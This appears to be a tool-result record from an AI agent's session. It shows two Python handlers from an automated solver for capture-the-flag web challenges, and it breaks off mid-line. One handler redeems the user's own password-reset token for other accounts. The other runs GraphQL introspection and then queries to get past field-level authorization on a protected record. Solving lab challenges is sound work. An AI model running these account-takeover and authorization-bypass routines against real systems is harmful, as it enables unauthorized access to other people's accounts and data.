{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01WsEyAkhSmUoiPHPz6WNmyV","type":"tool_result","content":"=========== lib/web/handlers/day25_web_reset_expectations.py\n\"\"\"D25 \"Reset Expectations\" (web-exploitation-day-17-reset-expectations): password-reset token not bound to account.\n\nKit shape: /api/clues = {framework, feature_route, secondary_route, recovery_guide_route, current_role}; GET\nrecovery_guide_route -> {request_route, redeem_route, account_parameter, token_parameter, accounts:[{id, label,\nself_service}]}; GET request_route?account_id=<self_service id> -> {\"ok\":true,\"token\":...}; other ids ->\n{\"error\":\"self_service_only\"}; GET redeem_route?token=<own token>&account_id=<victim id> -> {\"ok\":true,\n\"effect\":\"synthetic_account_recovery\",\"evidence\":\"proof_...\"}. Re-runnable on any fresh target.\n\"\"\"\nimport json\nimport re\nimport urllib.parse\n\nfrom lib import websolve\n\n\ndef _json(body):\n    try:\n        j = json.loads(body or \"\")\n        return j if isinstance(j, dict) else {}\n    except ValueError:\n        return {}\n\n\ndef _route(cl, *pats):\n    for p in pats:\n        for k, v in cl.items():\n            if re.search(p, k, re.I) and isinstance(v, str) and re.fullmatch(r\"/[\\w./-]+\", v):\n                return v\n    return None\n\n\ndef _get(base, route, params):\n    url = urllib.parse.urljoin(base, route) + (\"?\" + urllib.parse.urlencode(params) if params else \"\")\n    st, body, _ = websolve.fetch(url)\n    if st == 405:   # POST-only step: form body\n        st, body, _ = websolve.fetch(urllib.parse.urljoin(base, route), data=params, method=\"POST\")\n    return body\n\n\ndef exploit(base, clues):\n    cl = clues if isinstance(clues, dict) else {}\n    guide_route = _route(cl, r\"recovery|reset\")\n    if not guide_route:\n        return None\n    guide = _json(websolve.fetch(urllib.parse.urljoin(base, guide_route))[1])\n    req = guide.get(\"request_route\") or _route(cl, r\"feature\")\n    redeem = guide.get(\"redeem_route\") or _route(cl, r\"secondary\")\n    acct_p = guide.get(\"account_parameter\") or \"account_id\"\n    tok_p = guide.get(\"token_parameter\") or \"token\"\n    accts = [a for a in guide.get(\"accounts\") or [] if isinstance(a, dict) and \"id\" in a]\n    mine = [a for a in accts if a.get(\"self_service\")]\n    victims = [a for a in accts if not a.get(\"self_service\")]\n    if not (req and mine and victims):\n        return None\n    tj = _json(_get(base, req, {acct_p: mine[0][\"id\"]}))\n    p = websolve.proof(json.dumps(tj))\n    if p:\n        return p\n    token = tj.get(tok_p) or tj.get(\"token\")\n    redeem = tj.get(\"redeem_route\") or redeem\n    if not (token and redeem):\n        return None\n    for v in victims:\n        p = websolve.proof(_get(base, redeem, {tok_p: token, acct_p: v[\"id\"]}))\n        if p:\n            return p\n    return None\n\n\nKEY_MAP = [(r\"recovery_guide_route|recovery|password_reset|reset_route\", \"day25_web_reset_expectations\")]\nHANDLERS = {\"day25_web_reset_expectations\": exploit}\n=========== lib/web/handlers/day25_web_resolver_revolt.py\n\"\"\"D25 \"Resolver Revolt\" (web-exploitation-day-18-resolver-revolt): GraphQL resolver with incomplete field-level authz.\n\nKit shape: /api/clues = {current_user, feature_route, protected_reference, note}; feature_route is a GraphQL endpoint\n(GET -> 404 not_found, POST JSON {\"query\"} works). Introspection exposes Query{caseIndex:[CaseReference], case(id:ID!):\nCase{id,title,note}}; the single's `case(id:<protected_reference>){note}` resolver skipped the field check and returned\nnote=proof_... Schema-driven here: every Query field that takes an arg is called with the protected reference and all\nscalar fields of its return type selected. \"Vary the protocol surface\" -> if POST JSON misses, retry the same query\nvia GET ?query= and form-encoded POST. Returns None when the endpoint isn't GraphQL. Re-runnable on any fresh target.\n\"\"\"\nimport json\nimport re\nimport urllib.parse\n\nfrom lib import websolve\n\n_INTRO = (\"{__schema{queryType{name fields{name args{name type{name kind ofType{name kind ofType{name}}}} \"\n          \"type{name kind ofType{name kind ofType{name kind}}}}} types{name kind fields{name type{name kind \"\n          \"ofType{name kind ofType{name kind}}}}}}}\")\n\n\ndef _j(body):\n    try:\n        return json.loads(body or \"\")\n    except Exception:\n        return {}\n\n\ndef _base_type(t):\n    while isinstance(t, dict) and t.get(\"ofType\") and not t.get(\"name\"):\n        t = t[\"ofType\"]\n    return (t or {}).get(\"name\"), (t or {}).get(\"kind\")\n\n\ndef _gql(url, query):\n    \"\"\"POST JSON, then GET ?query=, then form POST; first response carrying `data` or a proof wins.\"\"\"\n    tries = (\n        lambda: websolve.fetch(url, headers={\"Content-Type\": \"application/json\"},\n                               data=json.dumps({\"query\": query}).encode()),\n        lambda: websolve.fetch(url + (\"&\" if \"?\" in url else \"?\") + urllib.parse.urlencode({\"query\": query})),\n        lambda: websolve.fetch(url, data={\"query\": query}),\n    )\n    last = \"\"\n    for t in tries:\n        _, body, _ = t()\n        if websolve.PROOF_RE.search(body or \"\") or isinstance(_j(body).get(\"data\"), dict):\n            return body\n        last = body or last\n    return last\n\n\ndef exploit(base, clues):\n    cl = clues if isinstance(clues, dict) else {}\n    routes = [v for k, v in cl.items() if isinstance(v, str) and re.fullmatch(r\"/[\\w./-]+\", v)\n              and not v.startswith(\"/api/clues\")]\n    ref = next((v for k, v in cl.items() if re.search(r\"protected|private|target|reference\", k, re.I)\n                and not re.search(r\"public|route\", k, re.I) and isinstance(v, (int, str))), None)\n    for route in routes + [\"/graphql\"]:\n        url = urllib.parse.urljoin(base, route)\n        schema = (_j(_gql(url, _INTRO)).get(\"data\") or {}).get(\"__schema\")\n        if not isinstance(schema, dict):\n            continue\n        types = {t.get(\"name\"): t for t in schema.get(\"types\") or [] if isinstance(t, dict)}\n\n        def sel(tname, depth=0):\n            fs = []\n            for f in (types.get(tname) or {}).get(\"fields\") or []:\n                n, k = _base_type(f.get(\"type\"))\n                if k in (\"SCALAR\", \"ENUM\"):\n                    fs.append(f[\"name\"])\n                elif k == \"OBJECT\" and depth < 1 and not str(n).startswith(\"__\"):\n                    sub = sel(n, depth + 1)\n                    if sub:\n                        fs.append(f[\"name\"] + sub)\n            return \"{\" + \" \".join(fs) + \"}\" if fs else \"\"\n\n        parts = []\n        for i, f in enumerate((schema.get(\"queryType\") or {}).get(\"fields\") or []):\n            tname, kind = _base_type(f.get(\"type\"))\n            s = \"\" if kind in (\"SCALAR\", \"ENUM\") else sel(tname)\n            if kind not in (\"SCALAR\", \"ENUM\") and not s:\n                continue\n            args = f.get(\"args\") or []\n            if args:\n                if ref is None:\n                    continue\n                a = next((x for x in args if re.search(r\"id|ref\", x[\"name\"], re.I)), args[0])\n                parts.append(\"q%d:%s(%s:%s)%s\" % (i, f[\"name\"], a[\"name\"], json.dumps(str(ref)), s))\n            else:\n                parts.append(\"q%d:%s%s\" % (i, f[\"name\"], s))\n        if not parts:\n            continue\n        p = websolve.proof(_gql(url, \"{\" + \" \".join(parts) + \"}\"))\n        if p:\n            return p\n        # per-field fallback: one resolver erroring must not null the others\n        for q in parts:\n            p = websolve.proof(_gql(url, \"{\" + q + \"}\"))\n            if p:\n                return p\n        return None\n    return None\n\n\nKEY_MAP = [(r\"protected_reference|resolver|graphql|schema|case_index\", \"day25_web_resolver_revolt\")]\nHANDLER